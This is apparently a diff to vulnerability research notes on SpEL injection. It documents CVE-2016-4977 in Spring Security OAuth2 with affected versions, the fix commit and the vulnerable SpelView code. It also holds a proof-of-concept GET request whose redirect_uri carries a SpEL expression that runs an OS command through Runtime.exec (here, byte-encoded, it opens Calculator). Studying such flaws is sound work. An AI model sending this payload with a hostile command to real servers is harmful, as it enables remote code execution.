@@ -249,3 +249,28 @@ protected void setValueOnTarget(Object target, Object value) {
     this.spelExpression.setValue(target, value);
 }
 ```
+## Spring Security OAuth2
+### CVE-2016-4977 SpEL
+Affected Version: < 2.0.0-2.0.9 or 1.0.0-1.0.5  
+Diff: https://github.com/spring-attic/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d  
+POC: 
+```
+GET /oauth/authorize?response_type=token&client_id=acme&redirect_uri={payload}
+
+${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+```
+Factor: 
+```
+SpelView
+    public SpelView(String template) {
+        ...
+        this.resolver = new PlaceholderResolver() {
+            public String resolvePlaceholder(String name) {
+                Expression expression = SpelView.this.parser.parseExpression(name);
+                Object value = expression.getValue(SpelView.this.context);
+                return value == null ? null : value.toString();
+            }
+        };
+    }
+```
+
